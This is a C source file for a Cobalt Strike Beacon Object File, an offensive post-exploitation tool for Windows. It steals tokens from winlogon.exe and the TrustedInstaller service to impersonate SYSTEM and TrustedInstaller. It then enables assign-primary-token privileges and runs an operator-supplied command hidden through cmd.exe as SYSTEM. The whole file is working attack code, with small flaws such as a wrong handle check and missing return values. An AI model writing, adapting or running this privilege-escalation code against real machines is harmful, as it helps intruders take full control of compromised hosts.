#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "beacon.h"

#define DEBUG FALSE

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }

DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CreateProcessAsUserA(HANDLE, LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strncpy(char * __restrict__, const char * __restrict__, size_t);
DECLSPEC_IMPORT void __cdecl MSVCRT$memset(void *, int, size_t);

#define CMD_PREFIX "C:\\Windows\\System32\\cmd.exe"
#define MAX_COMMAND_LEN 1024

FARPROC Resolver(CHAR *lib, CHAR *func);
DWORD GetProcByPID(CHAR *name);
DWORD GetTrustedInstallerPID();
BOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage);
BOOL ElevateSystem(HANDLE *);
BOOL ElevateTrustedInstaller(HANDLE *);

FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
    if(DEBUG) {
	    printf("[%s] %s!%s at 0x%p\n", __func__, lib, func, ptr);
    }
	return ptr;
}

DWORD GetProcByPID(CHAR *name) {
    FARPROC CreateToolhelp32Snapshot = Resolver("kernel32.dll", "CreateToolhelp32Snapshot");
    FARPROC Process32First = Resolver("kernel32.dll", "Process32First");
    FARPROC Process32Next = Resolver("kernel32.dll", "Process32Next");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");
    FARPROC strcmp = Resolver("msvcrt.dll", "strcmp");

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD PID = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
        if(strcmp(pe32.szExeFile, name) == 0) {
            PID = pe32.th32ProcessID;
            printf("[%s] Process %s PID is %d\n", __func__, name, PID);
            break;
        }
        } while(Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return PID;
}

DWORD GetTrustedInstallerPID() {
    FARPROC OpenSCManager = Resolver("advapi32.dll", "OpenSCManagerA");
    FARPROC OpenService = Resolver("advapi32.dll", "OpenServiceA");
    FARPROC QueryServiceStatusEx = Resolver("advapi32.dll", "QueryServiceStatusEx");
    FARPROC StartService = Resolver("advapi32.dll", "StartServiceA");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");
    FARPROC SleepEx = Resolver("kernel32.dll", "SleepEx");

    DWORD PID = 0;
    SC_HANDLE schManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);

    if(schManager == NULL) {
        printf("[%s] OpenSCManager failed. Error: %d\n", __func__, GetLastError());
        return FALSE;
    }

    SC_HANDLE schService = OpenService(schManager, "TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);

     if(schManager == NULL) {
        printf("[%s] OpenService failed. Error: %d\n", __func__, GetLastError());
        CloseHandle(schManager);
        return FALSE;
    }  
    CloseHandle(schManager);

    SERVICE_STATUS_PROCESS ssp;
    DWORD dwSize = 0;

    while(QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {
        printf("[%s] QueryServiceStatusEx need %d bytes.\n", __func__, dwSize);
        if(ssp.dwCurrentState == SERVICE_STOPPED) {
            if(!StartService(schService, 0, NULL)) {
                printf("[%s] StartService failed. Error: %d\n", __func__, GetLastError());
                CloseHandle(schService);
                return FALSE; 
            }
        }
        if(ssp.dwCurrentState == SERVICE_RUNNING) {
            PID = ssp.dwProcessId;
            printf("[%s] TrustedInstaller Service PID is %d\n", __func__, PID);
            break;
        }
        SleepEx(5000, FALSE);
    }

    CloseHandle(schService); 
    return PID;
}

BOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage) {
    FARPROC OpenProcess = Resolver("kernel32.dll", "OpenProcess");
    FARPROC OpenProcessToken = Resolver("kernel32.dll", "OpenProcessToken");
    FARPROC DuplicateTokenEx = Resolver("advapi32.dll", "DuplicateTokenEx");
    FARPROC ImpersonateLoggedOnUser = Resolver("advapi32.dll", "ImpersonateLoggedOnUser");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);

    if(hProc == NULL) {
        printf("[%s] OpenProcess on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        return FALSE;
    }

    HANDLE hToken = NULL;
    if(!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        printf("[%s] OpenProcessToken on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    CloseHandle(hProc);
    
    HANDLE hDup = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = FALSE;

    if(!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenImpersonation, &hDup)) {
        printf("[%s] DuplicateTokenEx on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hToken);
        return FALSE;       
    }
    CloseHandle(hToken);

    if(!ImpersonateLoggedOnUser(hDup)) {
        printf("[%s] ImpersonateLoggedOnUser on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hDup);
        return FALSE;            
    }

    *hStorage = hDup;

    return TRUE;
}

BOOL ElevateSystem(HANDLE *hTokenSystem) {
    DWORD PID = GetProcByPID("winlogon.exe");
    if(PID != 0) {
        if(ImpersonateByPID(PID, hTokenSystem)) {
            printf("[%s] ImpersonateByPID(SYSTEM) succeeded.\n", __func__);
        }
    }
}

BOOL ElevateTrustedInstaller(HANDLE *hTokenTrustedInstaller) {
    DWORD PID = GetTrustedInstallerPID();
    if(PID != 0) {
        if(ImpersonateByPID(PID, hTokenTrustedInstaller)) {
            printf("[%s] ImpersonateByPID(TrustedInstaller) succeeded.\n", __func__);
        }
    }
}

BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, privilege, &luid)) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
}

BOOL RunSystemCommand(HANDLE hTokenSystem, const char *command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmdline[MAX_COMMAND_LEN + 32];
    HANDLE hPrimary = NULL;
    SECURITY_ATTRIBUTES sa;
    int prefixLen;
    int commandLen;

    if (command == NULL || command[0] == '\0' || hTokenSystem == NULL) {
        return FALSE;
    }

    prefixLen = MSVCRT$strlen(CMD_PREFIX);
    commandLen = MSVCRT$strlen(command);
    if (prefixLen + 4 + commandLen >= (int)sizeof(cmdline)) {
        printf("[%s] Command too long.\n", __func__);
        return FALSE;
    }

    MSVCRT$strncpy(cmdline, CMD_PREFIX, sizeof(cmdline));
    MSVCRT$strncpy(cmdline + prefixLen, " /c ", sizeof(cmdline) - prefixLen);
    MSVCRT$strncpy(cmdline + prefixLen + 4, command, sizeof(cmdline) - prefixLen - 4);

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = FALSE;

    if (!ADVAPI32$DuplicateTokenEx(hTokenSystem, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hPrimary)) {
        printf("[%s] DuplicateTokenEx(TokenPrimary) failed. Error: %d\n", __func__, KERNEL32$GetLastError());
        return FALSE;
    }

    {
        HANDLE hThreadToken = NULL;
        if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hThreadToken)) {
            EnablePrivilege(hThreadToken, "SeAssignPrimaryTokenPrivilege");
            EnablePrivilege(hThreadToken, "SeIncreaseQuotaPrivilege");
            KERNEL32$CloseHandle(hThreadToken);
        }
    }

    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!ADVAPI32$CreateProcessAsUserA(hPrimary, NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[%s] CreateProcessAsUser failed. Error: %d\n", __func__, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPrimary);
        return FALSE;
    }

    printf("[%s] Started cmd.exe PID %lu\n", __func__, pi.dwProcessId);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(hPrimary);
    return TRUE;
}

void go(char *args, int len) {
    HANDLE hTokenSystem = NULL;
    HANDLE hTokenTrustedInstaller = NULL;
    char *command = NULL;
    datap parser;

    FARPROC SetThreadToken = Resolver("kernel32.dll", "SetThreadToken");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");

    BeaconDataParse(&parser, args, len);
    command = BeaconDataExtract(&parser, NULL);
    
    ElevateSystem(&hTokenSystem);
    ElevateTrustedInstaller(&hTokenTrustedInstaller);

    printf("[%s] (SYSTEM) Token HANDLE 0x%p.\n", __func__, hTokenSystem);
    printf("[%s] (TrustedInstaller) Token HANDLE 0x%p.\n", __func__, hTokenTrustedInstaller);
    
    if (hTokenSystem != NULL && SetThreadToken(NULL, hTokenSystem)) {
        if (command != NULL && command[0] != '\0') {
            RunSystemCommand(hTokenSystem, command);
        }
    } else {
        printf("[%s] (SYSTEM) SetThreadToken failed. Error: %d.\n", __func__, GetLastError());
    }
    
    if(hTokenTrustedInstaller != NULL) {
        if(!SetThreadToken(NULL, hTokenTrustedInstaller)) {
            printf("[%s] (TrustedInstaller) SetThreadToken failed. Error: %d.\n", __func__, GetLastError());       
        }
    }
}
